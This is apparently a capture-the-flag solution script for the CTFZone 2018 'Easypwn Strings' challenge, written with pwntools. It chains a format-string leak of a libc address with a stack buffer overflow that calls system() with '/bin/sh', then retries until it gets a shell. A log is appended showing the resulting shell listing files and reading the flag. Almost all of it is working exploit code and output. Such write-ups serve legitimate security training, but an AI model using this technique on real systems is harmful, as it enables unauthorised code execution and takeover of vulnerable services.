#!/usr/bin/env python
###############################
## CTFZone 2018 - Write up
## Challenge : Easypwn Strings
## Author : icecube27
###############################
from pwn import *

HOST = "pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one"
PORT = 1234

libc = ELF("./babylibc")

puts_off    = libc.symbols["puts"]
system_off  = libc.symbols["system"]
puts_got    = p32(0x804b028)

# Initialize the connection with the remote server
def init():
    return remote(HOST, PORT)

# Call the function affected by a stack buffer overflow
def buffer_overflow(payload, p):
    p.sendline("T")
    p.recvuntil("Are you surprised?? (y or n)\r\n")
    p.sendline(payload)

# Call the function affected by a format string vulnerability
def format_string(payload, p):
    p.sendline("3")
    p.recvuntil("Set string:\r\n")
    p.sendline(payload)
    p.recvuntil("Set number:\r\n")
    p.sendline("0")
    p.recvuntil("Result:\r\n")
    return p.recvline()

def main():

    ############## Stage 1 - Leak a libc address  ###############
    # This stage aims to get a libc address to use in the second#
    # stage. As the binary is a 32-bit executable we can try to #
    # launch the exploit multiple time in order to trigger the  #
    # call to system.                                           #
    #############################################################
    p = init()
    data = format_string(puts_got + "%8$s", p)[4:8]
    puts_libc = u32(data)

    base = puts_libc - puts_off
    system_libc = base + system_off
    print("[+] puts@libc   = 0x{:08x}".format(puts_libc))
    print("[+] system@libc = 0x{:08x}".format(system_libc))

    ######### Stage 2 - Trigger the buffer overflow  ############
    # As we have a pseudo address of the system function we can #
    # try to trigger the vulnerability and hope that after      #
    # multiple attempts the system function will be called.     #
    #############################################################
    while True:
        p = init()
        payload  = "y; /bin/sh\x00"
        payload += "a" * (256 - len(payload)) + p32(system_libc)
        buffer_overflow(payload, p)
        data = p.recv()
        if not "/opt/strings.sh" in data:
            p.sendline("id")
            p.interactive()

if __name__ == "__main__":
    main()

"""
$ ls -al
[DEBUG] Sent 0x7 bytes:
    'ls -al\n'
[DEBUG] Received 0x12d bytes:
    'total 40\n'
    'drwxr-xr-x 2 root root  4096 Jul 21 09:11 .\n'
    'drwxr-xr-x 1 root root  4096 Jul 21 09:14 ..\n'
    '-rw-r--r-- 4 root root    35 Jul 17 09:55 flag.txt\n'
    '-rw------- 3 root root  3950 Jul 20 15:28 main.c\n'
    '-rwx--x--x 6 root root 16492 Jul 20 15:26 strings\n'
    '-rwxr-xr-x 1 root root    31 Jul 17 11:45 strings.sh\n'
total 40
drwxr-xr-x 2 root root  4096 Jul 21 09:11 .
drwxr-xr-x 1 root root  4096 Jul 21 09:14 ..
-rw-r--r-- 4 root root    35 Jul 17 09:55 flag.txt
-rw------- 3 root root  3950 Jul 20 15:28 main.c
-rwx--x--x 6 root root 16492 Jul 20 15:26 strings
-rwxr-xr-x 1 root root    31 Jul 17 11:45 strings.sh
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    'cat flag.txt\n'
[DEBUG] Received 0x23 bytes:
    00000000  63 74 66 7a  6f 6e 65 7b  65 34 24 59  5f 70 56 56  │ctfz│one{│e4$Y│_pVV│
    00000010  6e 5f 24 54  72 31 e2 84  96 36 5f 46  75 e2 84 96  │n_$T│r1··│·6_F│u···│
    00000020  43 7d 0a                                            │C}·│
    00000023
ctfzone{e4$Y_pVVn_$Tr1№6_Fu№C}
"""
